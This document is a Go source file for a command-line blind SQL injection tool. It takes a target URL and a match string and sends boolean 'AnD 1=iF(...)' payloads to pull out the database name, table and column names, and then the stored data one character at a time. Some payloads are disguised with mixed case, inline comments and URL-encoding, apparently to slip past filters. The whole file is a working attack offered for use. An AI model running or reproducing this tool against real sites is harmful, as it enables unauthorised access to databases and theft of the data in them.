package main

import (
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"regexp"
	"strconv"
	"strings"
)

type url_U string

var first_url url_U
var confirmation string
var charSet = []string{"a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "!", "@", "^", "&", "*", "(", ")", "_", "+", "{", "}", "[", "]", ";", ":", "'", ",", ".", "/", `"`, "<", ">", "?"}
var ranger = make([]string, 50)
var database_length_value int = 0
var database_name_value string = ""
var tables_number_value int = 0
var tables_number_length []int = make([]int, 0)
var tables_name_value []string = make([]string, 0)
var pproxy string

type column struct {
	table                 string
	columns_number_value  int
	columns_number_length []int
	columns_name_value    []string
}

var columns []column

func request_to(u string) string {
	if pproxy == "" {
		resp, err := http.Get(u)
		if err != nil {
			log.Fatal(err)
		}
		defer resp.Body.Close()
		body, err := io.ReadAll(resp.Body)
		if err != nil {
			log.Fatal(err)
		}
		return string(body)
	}
	if pproxy != "" {
		// create the HTTP client with the specified proxy
		proxyUrl, err := url.Parse(pproxy)
		if err != nil {
			log.Fatal("Error parsing proxy URL:", err)
		}
		client := &http.Client{
			Transport: &http.Transport{
				Proxy: http.ProxyURL(proxyUrl),
			},
		}

		// create the HTTP request
		req, err := http.NewRequest("GET", u, nil)
		if err != nil {
			log.Fatal("Error creating request:", err)
		}

		// send the HTTP request and get the response
		resp, err := client.Do(req)
		if err != nil {
			log.Fatal("Error sending request:", err)

		}
		defer resp.Body.Close()

		// read the response body and print it
		body, err := io.ReadAll(resp.Body)
		if err != nil {
			log.Fatal("Error reading response body:", err)
		}
		return string(body)
	}
	return ""
}

func (input url_U) changeURL(text string) string {
	re := regexp.MustCompile("MEYDI")
	url_new := re.ReplaceAllString(string(input), text)
	return url_new
}

func checker(body string, confirmation string) bool {
	// Check if the body contains the "confirmation"
	if strings.Contains(string(body), confirmation) {
		return true
	} else {
		return false
	}
}

func (u url_U) bool_test(c string) bool {
	payload := "AnD/**/1=PY"
	re := regexp.MustCompile("PY")
	not_changed_url := request_to(u.changeURL(""))
	payload_new_1 := re.ReplaceAllString(payload, "1")
	changed_url_1 := request_to(u.changeURL(payload_new_1))
	payload_new_2 := re.ReplaceAllString(payload, "2")
	changed_url_2 := request_to(u.changeURL(payload_new_2))
	if checker(changed_url_1, c) != checker(changed_url_2, c) && checker(changed_url_1, c) == checker(not_changed_url, c) {
		return true
	} else {
		return false
	}

}
func (u url_U) database_length(c string) bool {
	payload := "AnD/**/1=iF((SelEcT/**/length(DatAbaSe()))=NUM,1,0)"
	re := regexp.MustCompile("NUM")
	for i := range ranger {
		payload_new := re.ReplaceAllString(payload, strconv.Itoa(i))
		if checker(request_to(u.changeURL(payload_new)), c) {
			fmt.Println("the length of the database = ", i)
			database_length_value = i
			return true
		}
	}
	return false
}

func (u url_U) database_name(c string) bool {
	for i := 1; i <= database_length_value; i++ {
		payload := fmt.Sprintf("AnD/**/1=iF((SelEcT/**/SUbSTrING(DatAbaSe(),%d,1))=\"WORD\",1,0)", i)
		re := regexp.MustCompile("WORD")
		for _, word := range charSet {
			payload_new := re.ReplaceAllString(payload, word)
			if checker(request_to(u.changeURL(payload_new)), c) {
				database_name_value += word
				if i == database_length_value {
					fmt.Println("the name of the current database = ", database_name_value)
					return true
				}
				break
			}
		}
	}
	return false
}

func (u url_U) tables_count(c string) bool {
	payload := "AnD/**/1=iF((SelEcT/**/Co%55%6et(*)/**//*!FrOm*//**/%69%6e%66orMaTion_Sc%68%65MA.%0DtA%42%6ceS/**/wHeRe/**/Ta%42%6ce_Sc%68%65MA=DatAbaSe%0D())=NUM,1,0)"
	for i := range ranger {
		new_payload := strings.ReplaceAll(payload, "NUM", strconv.Itoa(i))
		if checker(request_to(u.changeURL(new_payload)), c) {
			tables_number_value = i
			fmt.Println("table numbers in current database : ", tables_number_value)
			return true
		}
	}
	return false
}

func (u url_U) tables_length(c string, ranger []string) bool {
	for t := 0; t < tables_number_value; t++ {
		payload := fmt.Sprintf("AnD/**/1=iF((SelEcT/**/LENGTH(table_name)/**/FrOm/**/InForMaTion_ScheMA.tAbLeS/**/wHeRe/**/TaBle_scHemA=DatAbaSe()/**/LImIt/**/%d,1)=NUM,1,0)", t)
		re := regexp.MustCompile("NUM")
		for i := range ranger {
			payload_new := re.ReplaceAllString(payload, strconv.Itoa(i))
			if checker(request_to(u.changeURL(payload_new)), c) {
				tables_number_length = append(tables_number_length, i)
				if t == tables_number_value-1 {
					return true
				}
				break
			}
		}
	}
	return false
}

func (u url_U) tables_name(c string) bool {
	var table_name string
	for t := 0; t < tables_number_value; t++ {
		table_name = ""
		payload := fmt.Sprintf("AnD/**/1=iF((SelEcT/**/table_name/**/FrOm/**/InForMaTion_ScheMA.tAbLeS/**/wHeRe/**/TaBle_scHemA=DatAbaSe()/**/LImIt/**/%d,1)/**/LIKE/**/'WORD',1,0)", t)
		re := regexp.MustCompile("WORD")
		for i := 0; i < tables_number_length[t]; i++ {
			for _, s := range charSet {
				payload_new := re.ReplaceAllString(payload, table_name+s+"%")
				if checker(request_to(u.changeURL(payload_new)), c) {
					table_name = table_name + s
					if i == tables_number_length[t]-1 {
						tables_name_value = append(tables_name_value, table_name)
						fmt.Println("table_name_", t+1, " : ", tables_name_value[t])
						if t == tables_number_value-1 && i == tables_number_length[t]-1 {
							return true
						}
					}
					break
				}
			}
		}
	}
	return false
}

func (u url_U) columns_name(c string) bool {
	for z, t := range tables_name_value {
		payload := fmt.Sprintf("AnD/**/1=iF((SelEcT/**/CoUnt(column_name)/**/FrOm/**/InForMaTion_ScheMA.cOluMnS/**/wHeRe/**/TaBle_scHemA=DatAbaSe()/**/AnD/**/table_name='%s')=NUM,1,0)", t)
		for i := range ranger {

			new_payload := strings.ReplaceAll(payload, "NUM", strconv.Itoa(i))
			if checker(request_to(u.changeURL(new_payload)), c) {
				columns = append(columns, column{table: t, columns_number_value: i})
				fmt.Println("columns number in ", t, " : ", columns[z].columns_number_value)
				for col := 0; col < columns[z].columns_number_value; col++ {
					var column_name_add string
					for q := range ranger {
						payload = fmt.Sprintf("AnD/**/1=iF((SelEcT/**/LENGTH(column_name)/**/FrOm/**/InForMaTion_ScheMA.cOluMnS/**/wHeRe/**/TaBle_scHemA=DatAbaSe()/**/AnD/**/table_name='%s'/**/LImIt/**/%d,1)=%d,1,0)", t, col, q)
						if checker(request_to(u.changeURL(payload)), c) {
							columns[z].columns_number_length = append(columns[z].columns_number_length, q)
							for p := 0; p < columns[z].columns_number_length[col]; p++ {
								payload = fmt.Sprintf("AnD/**/1=iF((SelEcT/**/column_name/**/FrOm/**/InForMaTion_ScheMA.cOluMnS/**/wHeRe/**/TaBle_scHemA=DatAbaSe()/**/AnD/**/table_name='%s'/**/LImIt/**/%d,1)/**/LIKE/**/'WORD',1,0)", t, col)
								for _, k := range charSet {
									re := regexp.MustCompile("WORD")
									payload_new := re.ReplaceAllString(payload, column_name_add+k+"%")
									if checker(request_to(u.changeURL(payload_new)), c) {
										column_name_add = column_name_add + k
										if p == columns[z].columns_number_length[col]-1 {
											columns[z].columns_name_value = append(columns[z].columns_name_value, column_name_add)
											fmt.Println("column ", col+1, " name in ", t, " : ", columns[z].columns_name_value[col])
											if z == len(tables_name_value)-1 && col == columns[z].columns_number_value-1 && p == columns[z].columns_number_length[col]-1 {
												return true
											}
										}
										break
									}
								}
							}

						}
					}
				}

			}
		}
	}
	return false
}

func (u url_U) dump(c string) {
	for z, t := range tables_name_value {
		for _, col := range columns[z].columns_name_value {
			for num := range ranger {
				payload := fmt.Sprintf("AnD/**/1=iF((SelEcT/**/LENGTH(%s)/**/FrOm/**/%s/**/LImIt/**/1)=%d,1,0)", col, t, num)
				if checker(request_to(u.changeURL(payload)), c) {
					value := ""
					fmt.Println("")
					fmt.Print(col, " : ")
					for v := 0; v < num; v++ {
						for _, w := range charSet {
							payload := fmt.Sprintf("AnD/**/1=iF((SelEcT/**/%s/**/FrOm/**/%s/**/LImIt/**/1)/**/LIKE/**/'WORD',1,0)", col, t)
							re := regexp.MustCompile("WORD")
							payload_new := re.ReplaceAllString(payload, value+w+"%")
							if checker(request_to(u.changeURL(payload_new)), c) {
								value = value + w
								fmt.Print(w)
								break
							}
						}
					}
					break
				}
			}
		}
	}
}

func main() {

	iurl := flag.String("u", "", "get the url from user")
	proxy_fy := flag.String("p", "", "proxy the request: for example enter http://127.0.0.1:8080")
	confirm := flag.String("c", "", "get the matcher from user")
	flag.Parse()
	confirmation := *confirm
	pproxy = *proxy_fy
	new_url := url_U("/**/MEYDI%23")
	first_url = url_U(*iurl) + new_url

	if first_url.bool_test(confirmation) {
		if first_url.database_length(confirmation) {
			if first_url.database_name(confirmation) {
				if first_url.tables_count(confirmation) {
					if first_url.tables_length(confirmation, ranger) {
						if first_url.tables_name(confirmation) {
							if first_url.columns_name(confirmation) {
								first_url.dump(confirmation)
							} else {
								fmt.Println("i can't get the name of columns")
							}
						} else {
							fmt.Println("i can't get the name of tables")
						}
					} else {
						fmt.Println("i can't get the length of tables")
					}
				} else {
					fmt.Println("i can't get the number of tables")
				}
			} else {
				fmt.Println("i can't get the database name")
			}
		} else {
			fmt.Println("i can't get the database length")
		}
	} else {
		fmt.Println("Error!")
	}

}
